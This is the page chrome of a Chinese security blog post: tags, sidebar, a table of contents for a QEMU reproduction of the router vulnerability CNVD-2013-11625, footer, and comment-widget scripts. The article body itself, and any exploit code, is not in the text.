class="post-meta__tags" href="/tags/CVE/">CVE</a><a class="post-meta__tags" href="/tags/IOT/">IOT</a><a class="post-meta__tags" href="/tags/QEMU/">QEMU</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cover-131.jpg" data-sites="facebook, twitter, wechat, weibo, qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 奖励我一杯咖啡☕</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/rewards/wechat.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/wechat.png" alt="微信支付"></a><div class="post-qr-code-desc">微信支付</div></li><li class="reward-item"><a href="/img/rewards/alipay.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/alipay.png" alt="支付宝"></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/3fd254db.html" title="IOT环境搭建与固件分析"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-130.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IOT环境搭建与固件分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/f0cbf9ee.html" title="IOT固件仿真与gdbserver远程调试"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">IOT固件仿真与gdbserver远程调试</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/f0cbf9ee.html" title="IOT固件仿真与gdbserver远程调试"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-07-08</div><div class="title">IOT固件仿真与gdbserver远程调试</div></div></a></div><div><a href="/posts/f5dbafd0.html" title="AFL++环境搭建与模糊测试"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-135.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-10-15</div><div class="title">AFL++环境搭建与模糊测试</div></div></a></div><div><a href="/posts/3fd254db.html" title="IOT环境搭建与固件分析"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-130.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-08-14</div><div class="title">IOT环境搭建与固件分析</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="author_top is-center"><div class="card-info-avatar"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='this.onerror=null,this.src="/img/404/loading_404.gif"' alt="avatar"></div><div class="author-status-box"><div class="author-status"><g-emoji class="g-emoji" alias="palm_tree" fallback-src="https://lskypro.acozycotage.net/LightPicture/2022/12/fe1dc0402e623096.jpg">🎓</g-emoji><span>毕业快乐！</span></div></div></div><div class="author-info__name">uf4te</div><div class="author-info__description">天道酬勤，保持热爱，奔赴山海</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a><a href="/commentwall/"><div class="headline">评论</div><div class="length-num comment-total">0</div></a><a href="/about/#reward-me"><div class="headline">赞助</div><div class="length-num reward-total">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/uf4te/uf4te.github.io"><i class="fab fa-github"></i><span>给我的网站一个star 🤗</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:916884674@qq.com" target="_blank" title="mail 我的邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="/img/me/QRCode_QQ.png" target="_blank" title="加我 QQ"><i class="iconfont icon-qq"></i></a><a class="social-icon" href="/img/me/QRCode_WeChat.png" target="_blank" title="加我微信"><i class="iconfont icon-weixin"></i></a><a class="social-icon" href="/photo/myphotography" target="_blank" title="uf4te 的摄影集"><i class="iconfont icon-xiangji"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS 订阅"><i class="iconfont icon-dingyue"></i></a><a class="social-icon" href="/about/#reward-me" target="_blank" title="赞助本站"><i class="iconfont icon-zanzhu"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="iconfont icon-huanying"></i><span>欢迎来到我的小站</span></div><div class="announcement_content">我是一个喜欢学习 PWN 和逆向的二进制 CTFer，加油，互勉！</div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="iconfont icon-naozhong"></i><span>计时小助手</span></div><div id="timing"></div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="iconfont icon-gonggao"></i><span>最新公告</span></div><div class="newest_announcement_content">可以在《互动 -&gt; 我的说说》下查看本站的更新及动态：<a href="https://www.uf4te.cn/artitalk/" target="_blank" title="点击直达">我的说说</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CNVD-2013-11625"><span class="toc-text">CNVD-2013-11625</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E5%B7%A5%E5%85%B7"><span class="toc-text">复现工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="toc-text">复现漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QEMU-%E7%B3%BB%E7%BB%9F%E7%BA%A7%E5%A4%8D%E7%8E%B0"><span class="toc-text">QEMU 系统级复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%90%91-QEMU-%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E4%BC%A0-payload"><span class="toc-text">法一：向 QEMU 虚拟机上传 payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87"><span class="toc-text">法二：向 httpd 服务发送 HTTP 报文</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QEMU-%E7%94%A8%E6%88%B7%E7%BA%A7%E5%A4%8D%E7%8E%B0"><span class="toc-text">QEMU 用户级复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%91%E7%94%A8%E6%88%B7%E6%80%81-QEMU-%E4%BC%A0%E9%80%92-payload-%E5%8F%82%E6%95%B0"><span class="toc-text">向用户态 QEMU 传递 payload 参数</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f5dbafd0.html" title="AFL++环境搭建与模糊测试"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-135.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="AFL++环境搭建与模糊测试"></a><div class="content"><a class="title" href="/posts/f5dbafd0.html" title="AFL++环境搭建与模糊测试">AFL++环境搭建与模糊测试</a><time datetime="2024-10-14T15:06:13.000Z" title="发表于 2024-10-14 23:06:13">2024-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/194d06e.html" title="U盘重装系统以及Ubuntu与Windows双系统"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-134.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="U盘重装系统以及Ubuntu与Windows双系统"></a><div class="content"><a class="title" href="/posts/194d06e.html" title="U盘重装系统以及Ubuntu与Windows双系统">U盘重装系统以及Ubuntu与Windows双系统</a><time datetime="2024-09-28T04:30:04.000Z" title="发表于 2024-09-28 12:30:04">2024-09-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bb411a4c.html" title="多架构与交叉编译"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-133.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="多架构与交叉编译"></a><div class="content"><a class="title" href="/posts/bb411a4c.html" title="多架构与交叉编译">多架构与交叉编译</a><time datetime="2024-06-16T14:48:33.000Z" title="发表于 2024-06-16 22:48:33">2024-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f0cbf9ee.html" title="IOT固件仿真与gdbserver远程调试"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="IOT固件仿真与gdbserver远程调试"></a><div class="content"><a class="title" href="/posts/f0cbf9ee.html" title="IOT固件仿真与gdbserver远程调试">IOT固件仿真与gdbserver远程调试</a><time datetime="2024-06-16T14:16:49.000Z" title="发表于 2024-06-16 22:16:49">2024-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c2233a9.html" title="CNVD-2013-11625复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-131.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="CNVD-2013-11625复现"></a><div class="content"><a class="title" href="/posts/c2233a9.html" title="CNVD-2013-11625复现">CNVD-2013-11625复现</a><time datetime="2024-06-12T13:03:01.000Z" title="发表于 2024-06-12 21:03:01">2024-06-12</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">©2023 - 2025 By uf4te</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="running-time"></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/3GoBenqrrrBby5er/quote.js?theme=#1690FF,#00C4B6,#CACACA,#00C4B6,#FFFFFF,#1690FF,14&amp;f=12"></script><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" title="博客框架 Hexo_v6.3.0"></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" title="主题版本 Butterfly_v4.7.0"></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-black?style=flat&amp;logo=Vercel" title="本站采用多线部署，主线路部署于 Vercel"></a><a class="github-badge" target="_blank" href="https://www.cloudflare.com/zh-cn/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Cloudflare-F38020?style=flat&amp;logo=Cloudflare" title="本站采用多线部署，备用线路部署于 Cloudflare"></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" title="本站项目主要由 Github 托管与备份"></a><a class="github-badge" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-FF3030?style=flat&amp;logo=Claris" title="本站采用知识共享署名 - 非商业性使用 - 相同方式共享 4.0 国际许可协议进行许可"></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20240052" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20240052%E5%8F%B7-fe1384?style-flat&amp;logo=data:image/png;base64,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" title="本站已通过萌备备案：萌ICP备20240052号"></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="go-down" type="button" title="刷新页面" onclick="window.location.reload()"><i class="fa-solid fa-arrows-rotate"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fa-solid fa-book-open-reader"></i></button><button id="translateLink" type="button" title="繁简切换">繁</button><button id="darkmode" type="button" title="昼夜切换"><i class="fa-solid fa-moon"></i></button><button id="hide-aside-btn" type="button" title="全屏模式" onclick="rmf.fullScreen()"><i class="fas fa-expand"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fa fa-comments"></i></a><button id="go-down" type="button" title="分享本页" onclick="rmf.copyWordsLink()"><i class="fa-solid fa-share-from-square"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight,500)"><i class="fas fa-arrow-down"></i></button></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" title="后退一步" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" title="前进一步" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" title="刷新页面" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" title="直达顶部" href="javascript:btf.scrollToDest(0, 500)"><i class="fa fa-arrow-up"></i></a><a class="rightMenu-item" title="直达底部" href="javascript:btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" href="/archives/"><i class="fa-solid fa-calendar-days"></i><span>文章归档</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="fas fa-tags"></i><span>文章标签</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="fas fa-folder-open"></i><span>文章分类</span></a><a class="rightMenu-item" href="javascript:toRandomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.bing.com/search?q=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa-brands fa-edge"></i><span>用Bing搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fa fa-comments"></i><span>直达评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.click()"><i class="fa fa-arrows-alt"></i><span>全屏显示</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:rmf.switchDarkMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item menu-link" href="/copyright/"><i class="fa-solid fa-copyright"></i><span>本站协议</span></a><a class="rightMenu-item menu-link" href="/about/"><i class="fa-regular fa-address-card"></i><span>关于本站</span></a><a class="rightMenu-item menu-link" href="/about/#reward-me"><i class="fa-sharp fa-solid fa-heart-circle-bolt"></i><span>赞助本站</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadWaline(){function e(){Waline.init(Object.assign({el:"#waline-wrap",reaction:!0,serverURL:"https://waline.uf4te.cn",avatarCDN:"https://cn.cravatar.com/avatar/",pageview:!0,dark:'html[data-theme="dark"]',path:window.location.pathname,comment:!0,reaction:["https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_wink.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_blush.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_think.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_awkward.png"]},{locale:{nick:"昵称 (选填)",mail:"邮箱 (建议填写)",link:"你的主页 (选填)",placeholder:"请文明发言，牢记社会主义核心价值观！（不填写昵称和邮箱可以匿名评论，但建议填写邮箱可在被回复时收到邮件提醒，邮箱信息不会被公开）",requiredMeta:[],sofa:"有什么想说的？快来发表评论抢沙发吧！",login:"登录 (可选)",anonymous:"某不知名网友",level0:"潜水",level1:"冒泡",level2:"吐槽",level3:"活跃",level4:"话痨",level5:"传说",reactionTitle:"感觉怎么样，评价一下？",reaction0:"感觉很赞",reaction1:"支持一下",reaction2:"感觉一般",reaction3:"勉勉强强"}}))}const n=document.getElementById("waline-css");"object"==typeof Waline?n?e():getCSS("/css/waline.css","waline-css").then(e):getCSS("/css/waline.css","waline-css").then((()=>{getScript("/js/waline.js").then(e)}))}{function loadOtherComment(){loadWaline()}setTimeout(loadWaline,0)}</script></div><script>window.addEventListener("load",(()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <div class='name'><span>${e[n].nick} / </span><time datetime="${e[n].date}">${btf.diffDate(e[n].date,!0)}</time></div>\n        </div></div>`}else t+="没有评论";let n=document.querySelector("#card-newest-comments .aside-list");n.innerHTML=t,window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=saveToLocal.get("waline-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{Waline.RecentComments({serverURL:"https://waline.uf4te.cn",count:13}).then((({comments:t})=>{let n=t.filter((e=>"uf4te"!==e.nick));n.length<3&&(n=n.concat(t.filter((e=>"uf4te"===e.nick)).slice(0,3-n.length)));const a=n.slice(0,3).map((e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=t.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[图片]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[链接]")).replace(/<pre><code>.*?<\/pre>/gi,"[代码]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.objectId,date:e.insertedAt};var t}));saveToLocal.set("waline-newest-comments",JSON.stringify(a),10/1440),e(a)})).catch((e=>{document.querySelector("#card-newest-comments .aside-list").innerHTML="无法获取评论，请确认相关配置是否正确"}))};"object"==typeof 